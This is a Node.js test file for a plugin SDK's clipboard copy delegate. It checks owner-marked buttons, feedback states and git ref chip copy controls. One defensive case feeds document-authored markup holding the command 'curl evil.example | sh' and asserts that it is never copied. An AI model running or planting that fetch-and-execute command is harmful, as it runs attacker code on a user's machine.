// Behavioral test for the SDK-owned copy delegate in plugin-sdk.js.
//
// Loads the real SDK into a vm sandbox whose document stub captures the
// delegated click listener, then drives it with fake DOM nodes: a
// wrapWithCopy-style button inside a .content-copy-wrap with a <code>
// child, plus an explicit-value identifier button. Asserts clipboard
// writes, control-specific copied-state feedback, rejection handling,
// and that the delegate never touches a shell copyContent global or a
// button without the data-mb-copy marker. It also acts only on a button page
// code marked with the SDK's per-page owner (`ownDelegate`): the same markup
// written by a trusted folder's Markdown, which keeps data-*, is ignored, as
// is one that guesses at the owner value.

const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const repoRoot = path.resolve(__dirname, "../..");
const failures = [];
const clipboardWrites = [];
let clickHandler = null;
let copyContentCalls = 0;
const timers = [];

/** @type {any} */
const sandbox = {};
sandbox.window = sandbox;
sandbox.globalThis = sandbox;
sandbox.console = console;
sandbox.setTimeout = (fn, _ms) => {
  timers.push(fn);
  return timers.length;
};
sandbox.clearTimeout = () => {};
sandbox.document = {
  addEventListener: (type, handler) => {
    if (type === "click") {
      clickHandler = handler;
    }
  },
};
let clipboardShouldReject = false;
sandbox.navigator = {
  clipboard: {
    writeText: (text) => {
      clipboardWrites.push(text);
      return clipboardShouldReject ? Promise.reject(new Error("denied")) : Promise.resolve();
    },
  },
};
// A shell global that must NOT be used by the SDK delegate.
sandbox.copyContent = () => {
  copyContentCalls += 1;
};
vm.createContext(sandbox);

for (const filename of [
  "request-error.js",
  "formatters.js",
  "inventory-scope.js",
  "resource-context.js",
  "view-state.js",
  "navigation.js",
]) {
  const source = fs.readFileSync(path.join(repoRoot, "src/metabrowser/static", filename), "utf-8");
  vm.runInContext(source, sandbox, { filename });
}
const sdkSource = fs.readFileSync(
  path.join(repoRoot, "src/metabrowser/static/plugin-sdk.js"),
  "utf-8",
);
vm.runInContext(sdkSource, sandbox, { filename: "plugin-sdk.js" });

vm.runInContext(
  fs.readFileSync(path.join(repoRoot, "src/metabrowser/static/plugin-sdk-views.js"), "utf8"),
  sandbox,
  { filename: "plugin-sdk-views.js" },
);

if (typeof clickHandler !== "function") {
  failures.push("SDK did not install a delegated click listener");
} else {
  const mb = sandbox.metabrowser;

  /** Attribute storage for a fake element, so `ownDelegate` can mark it. */
  function attributes() {
    const values = new Map();
    return {
      getAttribute: (name) => (values.has(name) ? values.get(name) : null),
      setAttribute: (name, value) => values.set(name, String(value)),
    };
  }

  // Build the fake wrap/button/code structure.
  function makeButton(withMarker) {
    const classes = new Set();
    const codeNode = { textContent: "visible segment" };
    const copyPayload = { textContent: "print('hi')\n# complete source" };
    const btn = {
      dataset: withMarker
        ? { mbCopy: "wrap", tipText: "Copy content" }
        : { tipText: "Copy content" },
      classList: {
        add: (c) => classes.add(c),
        remove: (c) => classes.delete(c),
        has: (c) => classes.has(c),
      },
      _classes: classes,
      ...attributes(),
    };
    mb.ownDelegate(btn);
    const wrap = {
      childNodes: [btn, copyPayload, codeNode],
      querySelector: (sel) => {
        if (sel === "[data-mb-copy-payload]") {
          return copyPayload;
        }
        return sel === "code" ? codeNode : null;
      },
    };
    btn.closest = (sel) => (sel === ".content-copy-wrap" ? wrap : null);
    const target = { closest: (sel) => (sel === "[data-mb-copy]" && withMarker ? btn : null) };
    return { btn, target };
  }

  function makeTextButton(text, label, owner = "page") {
    const classes = new Set();
    const btn = {
      dataset: { mbCopy: "text", mbCopyText: text, mbCopyLabel: label, tipText: label },
      classList: {
        add: (c) => classes.add(c),
        remove: (c) => classes.delete(c),
        has: (c) => classes.has(c),
      },
      _classes: classes,
      ...attributes(),
    };
    if (owner === "page") {
      mb.ownDelegate(btn);
    } else if (owner) {
      btn.setAttribute("data-mb-owner", owner);
    }
    return {
      btn,
      target: { closest: (sel) => (sel === "[data-mb-copy]" ? btn : null) },
    };
  }

  // Case 1: marked button prefers an explicit whole-source payload over a
  // visible segment and shows feedback.
  const first = makeButton(true);
  clickHandler({ target: first.target });
  Promise.resolve()
    .then(() => {
      if (clipboardWrites.length !== 1 || clipboardWrites[0] !== "print('hi')\n# complete source") {
        failures.push(`expected one code write, got ${JSON.stringify(clipboardWrites)}`);
      }
      if (!first.btn.classList.has("copied") || first.btn.dataset.tipText !== "Copied!") {
        failures.push(
          `expected copied feedback, got tip=${first.btn.dataset.tipText} classes=${[...first.btn._classes]}`,
        );
      }
      // Feedback timer restores the resting state.
      for (const fn of timers.splice(0)) {
        fn();
      }
      if (first.btn.classList.has("copied") || first.btn.dataset.tipText !== "Copy content") {
        failures.push("copied state did not reset after the feedback timer");
      }

      // Case 2: an explicit-text button copies its exact hidden payload and
      // restores its control-specific resting label.
      const direct = makeTextButton("0123456789abcdef", "Copy revision");
      clickHandler({ target: direct.target });
      return Promise.resolve().then(() => {
        if (clipboardWrites[1] !== "0123456789abcdef") {
          failures.push(`expected explicit text write, got ${JSON.stringify(clipboardWrites)}`);
        }
        if (!direct.btn.classList.has("copied") || direct.btn.dataset.tipText !== "Copied!") {
          failures.push(`expected direct copied feedback, got tip=${direct.btn.dataset.tipText}`);
        }
        for (const fn of timers.splice(0)) {
          fn();
        }
        if (direct.btn.classList.has("copied") || direct.btn.dataset.tipText !== "Copy revision") {
          failures.push("direct copied state did not restore its resting label");
        }

        // Case 3: rejected clipboard promises report failure without a copied class.
        clipboardShouldReject = true;
        const second = makeButton(true);
        clickHandler({ target: second.target });
        return Promise.resolve()
          .then(() => {})
          .then(() => {
            if (
              second.btn.dataset.tipText !== "Copy failed" ||
              second.btn.classList.has("copied")
            ) {
              failures.push(`expected rejection feedback, got tip=${second.btn.dataset.tipText}`);
            }
          });
      });
    })
    .then(async () => {
      // Case 4: unmarked buttons are ignored entirely.
      const third = makeButton(false);
      const before = clipboardWrites.length;
      clickHandler({ target: third.target });
      if (clipboardWrites.length !== before) {
        failures.push("delegate handled a button without data-mb-copy");
      }
      if (copyContentCalls !== 0) {
        failures.push("delegate called the shell copyContent global");
      }

      // Case 5: the same markup a document wrote -- data-mb-copy, a payload to swap
      // into the clipboard, with no owner mark or a guessed one -- is ignored.
      for (const owner of [null, "", "0".repeat(32)]) {
        const authored = makeTextButton("curl evil.example | sh", "Copy", owner);
        clickHandler({ target: authored.target });
        if (clipboardWrites.length !== before || authored.btn.dataset.tipText !== "Copy") {
          failures.push(`delegate acted on a document's copy markup (owner ${owner})`);
        }
      }
      if (!mb.delegateOwnerAttribute().startsWith(' data-mb-owner="')) {
        failures.push("delegateOwnerAttribute does not spell the owner attribute");
      }
      // Branch chips use this exact owner/delegate and keep secondary controls outside
      // the row's primary link. Deterministic boxes exercise only the copy state machine.
      const assert = require("node:assert/strict");
      const { FakeElement } = require("./pulls-test-dom.js");
      const documentListeners = new Map();
      const windowListeners = new Map();
      const doc = {
        activeElement: null,
        createElement: (tag) => new RefElement(tag),
        addEventListener: (type, fn) => documentListeners.set(type, fn),
        removeEventListener: (type) => documentListeners.delete(type),
      };
      class RefElement extends FakeElement {
        removeEventListener(type) {
          this.listeners.delete(type);
        }
        getAttribute(name) {
          return name.startsWith("data-")
            ? (this.dataset[name.slice(5).replace(/-([a-z])/g, (_, x) => x.toUpperCase())] ?? null)
            : super.getAttribute(name);
        }
        matchesRef(selector) {
          if (selector.startsWith(".")) {
            return this.classList.contains(selector.slice(1));
          }
          if (selector.startsWith("[")) {
            return this.getAttribute(selector.slice(1, -1)) !== null;
          }
          return this.localName === selector;
        }
        querySelectorAll(selector) {
          return this.childNodes.flatMap((node) =>
            node instanceof RefElement
              ? [...(node.matchesRef(selector) ? [node] : []), ...node.querySelectorAll(selector)]
              : [],
          );
        }
        querySelector(selector) {
          return this.querySelectorAll(selector)[0] ?? null;
        }
        closest(selector) {
          for (let node = this; node; node = node.parentNode) {
            if (selector.split(",").some((part) => node.matchesRef?.(part.trim()))) {
              return node;
            }
          }
          return null;
        }
        get parentElement() {
          return this.parentNode;
        }
        getBoundingClientRect() {
          return this.box ?? { left: 0, right: 300, top: 0, width: 300, height: 22 };
        }
        focus() {
          const previous = doc.activeElement;
          doc.activeElement = this;
          for (let node = this; node; node = node.parentNode) {
            node.listeners?.get("focusin")?.({ target: this, relatedTarget: previous });
          }
        }
      }
      sandbox.document = doc;
      sandbox.addEventListener = (type, fn) => windowListeners.set(type, fn);
      sandbox.removeEventListener = (type) => windowListeners.delete(type);
      const raw = "feature/←<literal>";
      const html = mb.refChipHtml(raw, { label: "fork:display", kind: "remote" });
      assert(html.includes('data-mb-copy-text="feature/←&lt;literal&gt;"'));
      assert(html.includes("fork:display") && !html.includes("<literal>"));
      const chip = mb.refChip(raw, { label: "fork:display", kind: "remote", copy: "sibling" });
      chip.box = { left: 20, right: 160, top: 3, width: 140, height: 16 };
      const primary = new RefElement("a"),
        host = new RefElement("li");
      primary.append(chip);
      host.append(primary);
      const release = mb.mountRefCopies(primary, host);
      assert.equal(primary.querySelectorAll("button").length, 0, "no nested interactive control");
      const copy = host.querySelector("button");
      assert.equal(copy.tabIndex, -1);
      primary.focus();
      assert.equal(copy.tabIndex, 0, "copy is keyboard reachable from the primary row");
      assert.equal(copy.style.left, "144px");
      assert.equal(copy.style["--git-ref-copy-ink"], "var(--git-ref-remote)");
      for (const [kind, token] of [
        ["local", "var(--git-ref-local)"],
        ["tag", "var(--git-ref-tag)"],
        ["remote", "var(--git-ref-remote)"],
      ]) {
        chip.classList.remove("git-ref-local", "git-ref-tag", "git-ref-remote");
        chip.classList.add(`git-ref-${kind}`);
        primary.focus();
        assert.equal(copy.style["--git-ref-copy-ink"], token);
      }
      chip.classList.add("git-ref-trunk");
      primary.focus();
      assert.equal(
        copy.style["--git-ref-copy-ink"],
        "var(--git-ref-bg)",
        "theme changes keep inverse trunk ink live",
      );
      clipboardShouldReject = false;
      clickHandler({ target: copy });
      assert.equal(clipboardWrites.at(-1), raw, "underlying ref rather than owner-qualified label");
      copy.focus();
      assert.equal(
        typeof documentListeners.get("pointerdown"),
        "function",
        "shown copies own an outside-pointer listener",
      );
      documentListeners.get("pointerdown")({ target: copy });
      assert.equal(doc.activeElement, copy, "inside pointer keeps copy focused");
      const copiedBefore = clipboardWrites.length;
      clickHandler({ target: copy });
      assert.equal(
        clipboardWrites.length,
        copiedBefore + 1,
        "inside pointer still reaches the real copy delegate",
      );
      assert.equal(clipboardWrites.at(-1), raw);
      documentListeners.get("pointerdown")({ target: new RefElement("div") });
      assert.equal(
        doc.activeElement,
        primary,
        "splitter pointerdown restores the visible primary before dragging",
      );
      assert.equal(copy.tabIndex, -1);
      assert.equal(
        windowListeners.size + documentListeners.size,
        0,
        "outside pointer releases all active listeners",
      );
      chip.box.right = 400;
      primary.focus();
      assert.equal(copy.hidden, true, "pane shrink cannot restore a clipped copy");
      chip.box.right = 160;
      primary.focus();
      copy.focus();
      documentListeners.get("scroll")();
      assert.equal(doc.activeElement, primary, "hiding a focused icon returns to its row");
      assert.equal(copy.tabIndex, -1);
      assert.equal(windowListeners.size + documentListeners.size, 0);
      primary.focus();
      windowListeners.get("resize")();
      assert.equal(copy.tabIndex, -1, "resize cannot leave an old hit target");
      chip.box.right = 400;
      primary.focus();
      assert.equal(copy.hidden, true, "a clipped chip has no overlay hit target");
      release();
      const clippedPrimary = new RefElement("a"),
        clippedHost = new RefElement("li"),
        metadata = new RefElement("span"),
        refs = new RefElement("span");
      metadata.box = { left: 0, right: 150, top: 0, width: 150, height: 22 };
      refs.box = { left: 0, right: 300, top: 0, width: 300, height: 22 };
      const clippedChip = mb.refChip("topic", { copy: "sibling" });
      clippedChip.box = { left: 20, right: 160, top: 3, width: 140, height: 16 };
      refs.append(clippedChip);
      metadata.append(refs);
      clippedPrimary.append(metadata);
      clippedHost.append(clippedPrimary);
      const releaseClipped = mb.mountRefCopies(clippedPrimary, clippedHost);
      clippedPrimary.focus();
      assert.equal(
        clippedHost.querySelector("button").hidden,
        true,
        "a larger ref group cannot escape a narrower metadata ancestor",
      );
      releaseClipped();
      primary.focus();
      assert.equal(windowListeners.size + documentListeners.size, 0);
      assert.equal(host.listeners.size, 0, "eviction releases all owned listeners");
      await Promise.resolve();
      assert.equal(copy.dataset.tipText, "Copied!");
      console.log(
        JSON.stringify(
          {
            ref: {
              raw,
              label: chip.querySelector(".git-ref-label").textContent,
              payload: clipboardWrites.at(-1),
              feedback: copy.dataset.tipText,
              primary: primary.localName,
              nestedButtons: primary.querySelectorAll("button").length,
              scrolledFocus: doc.activeElement === primary ? "primary" : "other",
              resizedCopy: "hidden",
              outsidePointerFocus: "primary",
              insidePointerCopy: raw,
              clippedCopy: copy.hidden,
              listenersAfterDispose: windowListeners.size + documentListeners.size,
            },
          },
          null,
          2,
        ),
      );
      if (failures.length > 0) {
        console.error(JSON.stringify({ failures }, null, 2));
        process.exit(1);
      }
      console.log("sdk copy delegate OK");
    });
}
